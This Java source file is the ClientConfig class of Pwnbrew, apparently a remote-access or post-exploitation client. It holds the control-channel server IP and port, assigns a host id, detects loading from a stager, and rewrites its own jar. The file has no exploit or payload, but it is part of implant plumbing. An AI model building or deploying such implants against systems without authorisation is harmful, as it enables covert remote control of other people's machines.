/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


package pwnbrew;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.logging.Level;
import pwnbrew.log.LoggableException;
import pwnbrew.log.RemoteLog;
import pwnbrew.misc.Constants;
import pwnbrew.misc.LoaderUtilities;
import pwnbrew.misc.ManifestProperties;
import pwnbrew.misc.SocketUtilities;
import pwnbrew.misc.Utilities;

/**
 *
 *  
 */
public class ClientConfig {

    private String theHostId = "";
    private String theServerIp = "0.0.0.0";
    private int theServerId = -1;
    
    //Configurable Ports
    private int theSocketPort = 443;
  
    //The time to sleep between connections
    private static ClientConfig theConf = null;
       
    private static final long serialVersionUID = 1L;
    private static final String NAME_Class = ClientConfig.class.getSimpleName();
    
    // ==========================================================================
    /**
     * Constructor
     *
    */
    public ClientConfig() {    
    }

    //==========================================================================
    /**
     * Returns the host id
     * @return 
    */
    public String getHostId(){
        return theHostId;
    }

    //==========================================================================
    /**
     * Returns the port of the control channel
     * @return 
    */
    public int getSocketPort(){
        return theSocketPort;
    }

    //==========================================================================
    /**
     * Sets the port for the control channel
     * @param passedPort
    */
    public void setSocketPort( String passedPort ){
        theSocketPort = Integer.parseInt( passedPort );
    }
      
    //==========================================================================
    /**
     * Returns the server host ip
     * @return 
    */
    public String getServerIp(){
        return theServerIp;
    }
    
    //==========================================================================
    /**
     * Sets the server host ip
     * @param ipStr
    */
    public void setServerIp( String ipStr ) {
        if(ipStr != null)
            theServerIp = ipStr;        
    }

    //==========================================================================
    /**
     * Sets the host id
     * @param hostIdStr
    */
    public void setHostId(String hostIdStr) {
        if( hostIdStr != null )
            theHostId = hostIdStr;         
    }
    
     //==========================================================================
    /**
     * Returns the server id
     * @return 
    */
    public int getServerId(){
       return theServerId;
    }
    
     //==========================================================================
    /**
     * Sets the server id
     * @param passedId
    */
    public void setServerId( int passedId) {
        theServerId = passedId;
    }

    //==========================================================================
    /**
     * Writes the configuration file to the appropriate place
     * @throws pwnbrew.log.LoggableException
    */
    public void writeSelfToDisk() throws LoggableException {
        
        try {
            
            //Check for null
            File theClassPath = Utilities.getClassPath();
            ClassLoader aClassLoader;
            
            //Check if we are coming from a stager 
            if( Utilities.isStaged() ){
                Class stagerClass = Class.forName("stager.Stager");
                aClassLoader = stagerClass.getClassLoader();
            } else
                aClassLoader = ClassLoader.getSystemClassLoader();            
                    
            //Get the properties 
            String properties = Constants.PROP_FILE;
            String propLabel = Constants.HOST_ID_LABEL;
            
            //Unload the stager
            LoaderUtilities.unloadLibs( aClassLoader );

            //Add the client id
            Utilities.updateJarProperties( theClassPath, properties, propLabel, theHostId ); 
        
            //Load it back
            LoaderUtilities.reloadLib(theClassPath); 
            
        } catch (ClassNotFoundException ex) {
            RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );      
        } 

    }
      
    //===========================================================================
    /**
     * Returns the configuration object
     * @return 
    */
    public static ClientConfig getConfig(){
        
        if(theConf == null)
            theConf = loadConfiguration();        
        
        return theConf;
    }

    //==========================================================================
    /** 
    *  Loads the configuration into memory.
    */
    private static ClientConfig loadConfiguration(){
        
        //Create a new configuration file
        ClientConfig localConf = new ClientConfig();
        try {
        
            //Get the manifest
            ManifestProperties localProperties = new ManifestProperties();
            String properties = Constants.PROP_FILE;
            String propLabel = Constants.HOST_ID_LABEL;

            URL aURL = Utilities.getURL();
            String aStr = aURL.toExternalForm();

            final URL manifest =  new URL("jar:" + aStr + "!/" + properties);
            URLConnection theConnection = manifest.openConnection();
            InputStream localInputStream = theConnection.getInputStream();

            if (localInputStream != null) {

                //Load the properties
                localProperties.load(localInputStream);
                localInputStream.close();

                //Get the host id
                String hostId = localProperties.getProperty(propLabel, null);
                if( hostId == null || hostId.isEmpty() ){
                    //Create a new configuration file
                    Integer anInteger = SocketUtilities.getNextId();
                    localConf.setHostId(anInteger.toString());
                    localConf.writeSelfToDisk();
                } else 
                    localConf.setHostId( hostId );
                
            }
            
        } catch ( LoggableException ex ){
            RemoteLog.log(Level.WARNING, NAME_Class, "loadConfiguration()", ex.getMessage(), ex);
        } catch ( IOException ex ){
            RemoteLog.log(Level.WARNING, NAME_Class, "loadConfiguration()", ex.getMessage(), ex);
        }

       
        return localConf;
    } 

}/* END CLASS ClientConfig */
